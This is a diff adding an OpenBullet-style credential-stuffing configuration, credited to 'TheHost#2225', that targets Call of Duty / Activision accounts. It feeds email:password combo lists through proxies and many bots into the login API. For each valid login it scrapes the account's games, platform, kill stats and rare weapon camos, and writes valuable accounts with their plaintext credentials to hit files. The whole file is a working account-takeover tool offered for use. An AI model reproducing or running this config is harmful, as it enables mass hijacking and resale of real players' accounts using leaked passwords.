@@ -1,0 +1,221 @@
+[SETTINGS]
+{
+  "Name": "TheHost#2225",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-4T05:02:11.8580267+03:00",
+  "AdditionalInfo": "",
+  "Author": "TheHost#2225",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GenerateGUID -> VAR "0" 
+
+#Log REQUEST POST "https://profile.callofduty.com/cod/mapp/registerDevice" 
+  CONTENT "{\"deviceId\":\"<0>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/json" 
+
+#Code PARSE "<SOURCE>" JSON "authHeader" -> VAR "1" 
+
+#Log REQUEST POST "https://profile.callofduty.com/cod/mapp/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Authorization: bearer <1>" 
+  HEADER "x_cod_device_id: <0>" 
+
+#Login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+    KEY "errorMessage\":\"JSON parse " 
+
+PARSE "<SOURCE>" JSON "ACT_SSO_COOKIE" -> VAR "4" 
+
+#Info REQUEST GET "https://profile.callofduty.com/cod-mobile/userInfo/<4>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "atvi-auth: Bearer <4>" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+#1 PARSE "<SOURCE>" LR "emailValidated\":" ",\"" CreateEmpty=FALSE -> CAP "EmailValidated" 
+
+#2 PARSE "<SOURCE>" LR "gamerAccountLinked\":" ",\"" CreateEmpty=FALSE -> CAP "GamerAccountLinked" 
+
+#Country PARSE "<SOURCE>" LR "countryCode\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Country" 
+
+#Profile REQUEST GET "https://www.callofduty.com/api/papi-client/crm/cod/v2/identities/<4>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "atvi-auth: Bearer <4>" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+#Games PARSE "<SOURCE>" JSON "title" Recursive=TRUE CreateEmpty=FALSE -> CAP "Games" 
+
+#Platform PARSE "<SOURCE>" JSON "platform" Recursive=TRUE CreateEmpty=FALSE -> CAP "Platform" 
+
+#Platform PARSE "<SOURCE>" JSON "platform" -> VAR "2" 
+
+#User PARSE "<SOURCE>" JSON "username" -> VAR "3" 
+
+#Free KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"status\":\"success\",\"data\":{\"titleIdentities\":[]}}" 
+
+#encode_user FUNCTION URLEncode "<3>" -> VAR "3" 
+
+#Stats REQUEST GET "https://www.callofduty.com/api/papi-client/stats/cod/v1/title/mw/platform/<2>/gamer/<3>/profile/type/mp?locale=en" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "atvi-auth: Bearer <4>" 
+
+#all PARSE "<SOURCE>" JSON "all" -> VAR "all" 
+
+#Level PARSE "<SOURCE>" JSON "level" CreateEmpty=FALSE -> CAP "Level" 
+
+#KD PARSE "<SOURCE>" JSON "kdRatio" CreateEmpty=FALSE -> CAP "K/D" 
+
+#Kills PARSE "<all>" JSON "kills" CreateEmpty=FALSE -> CAP "Kills" 
+
+#Camo REQUEST GET "https://www.callofduty.com/api/papi-client/loadouts/v3/title/mw/platform/<2>/gamer/<3>/mode/mp" 
+  
+  HEADER "atvi-auth: Bearer <4>" 
+  HEADER "Accept: application/json, text/plain, */*" 
+
+IF "<SOURCE>" Contains "org.springframework.web.client.HttpClientErrorException","message":"404 NOT FOUND"
+
+FUNCTION Constant "No" -> CAP "Camo" 
+
+ELSE
+
+FUNCTION Constant "Yes" -> CAP "Camo" 
+
+ENDIF
+
+PARSE "<SOURCE>" LR "playerCamosOwnedByWeapon\":{\"" "}}}}" -> VAR "CAMO" 
+
+IF "<CAMO>" Contains "camo_11a"
+
+FUNCTION Constant "True" -> CAP "Gold" 
+
+ELSE
+
+FUNCTION Constant "False" -> CAP "Gold" 
+
+ENDIF
+IF "<CAMO>" Contains "camo_11b"
+
+FUNCTION Constant "True" -> CAP "Platinum" 
+
+ELSE
+
+FUNCTION Constant "False" -> CAP "Platinum" 
+
+ENDIF
+IF "<CAMO>" Contains "camo_11c"
+
+FUNCTION Constant "True" -> CAP "Damascus" 
+
+FUNCTION CountOccurrences "camo_11c" "<CAMO>" -> VAR "HMD" 
+
+ELSE
+
+FUNCTION Constant "False" -> CAP "Damascus" 
+
+ENDIF
+IF "<HMD>" GreaterThan "20"
+
+FUNCTION Constant "True" -> CAP "Damascus" 
+
+ELSE
+
+FUNCTION Constant "False" -> CAP "Damascus" 
+
+ENDIF
+IF "<CAMO>" Contains "camo_11d"
+
+FUNCTION Constant "True" -> CAP "Obsidian" 
+
+FUNCTION CountOccurrences "camo_11d" "<CAMO>" -> CAP "Obsidian Count" 
+
+ELSE
+
+FUNCTION Constant "False" -> CAP "Obsidian" 
+
+ENDIF
+ 
+FUNCTION Constant "TheHost#2225" -> CAP "Config By" 
+
+IF "<Damascus>" Contains "True"
+
+UTILITY File "Cod Damascus.txt" AppendLines "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\n««««««««««««[INFORMATION]»»»»»»»»»»»»\\nGames : <Games>\\nPlatform : <Platform>\\nGold: <Gold>\\nPlatinum : <Platinum>\\nDamascus : <Damascus>\\nObsidian : <Obsidian>\\nObsidian Count : <Obsidian Count>\\nLevel : <Level>\\nKills : <Kills>\\nK/D : <K/D>\\nSeason 6 Tier : <S6T> - Premium : <S6P>\\nSeason 5 Tier : <S5T> - Premium : <S5P>\\nSeason 4 Tier : <S4T> - Premium : <S4P>\\nSeason 3 Tier : <S3T> - Premium : <S3P>\\nSeason 2 Tier : <S2T> - Premium : <S2P>\\nSeason 1 Tier : <S1T> - Premium : <S1P>\\nCod Points : <Points>\\n««««««««««««[Config By:TheHost#2225]»»»»»»»»»»»»" 
+
+ENDIF
+IF "<Obsidian>" Contains "True"
+
+UTILITY File "Cod Obsidian.txt" AppendLines "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\n««««««««««««[INFORMATION]»»»»»»»»»»»»\\nGames : <Games>\\nPlatform : <Platform>\\nGold: <Gold>\\nPlatinum : <Platinum>\\nDamascus : <Damascus>\\nObsidian : <Obsidian>\\nObsidian Count : <Obsidian Count>\\nLevel : <Level>\\nKills : <Kills>\\nK/D : <K/D>\\nSeason 6 Tier : <S6T> - Premium : <S6P>\\nSeason 5 Tier : <S5T> - Premium : <S5P>\\nSeason 4 Tier : <S4T> - Premium : <S4P>\\nSeason 3 Tier : <S3T> - Premium : <S3P>\\nSeason 2 Tier : <S2T> - Premium : <S2P>\\nSeason 1 Tier : <S1T> - Premium : <S1P>\\nCod Points : <Points>\\n««««««««««««[Config By:TheHost#2225]»»»»»»»»»»»»" 
+
+ENDIF
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Kills>" LessThan "20000" 
+  KEYCHAIN Success OR 
+    KEY "<Kills>" GreaterThan "19999"  
+
+UTILITY File "DAMASCUSACCOUNTS.txt" Append "««««««[Account]»»»»»»\\nCombo:<USER>:<PASS>\\nMail:<USER>\\nPassword:<PASS>\\"
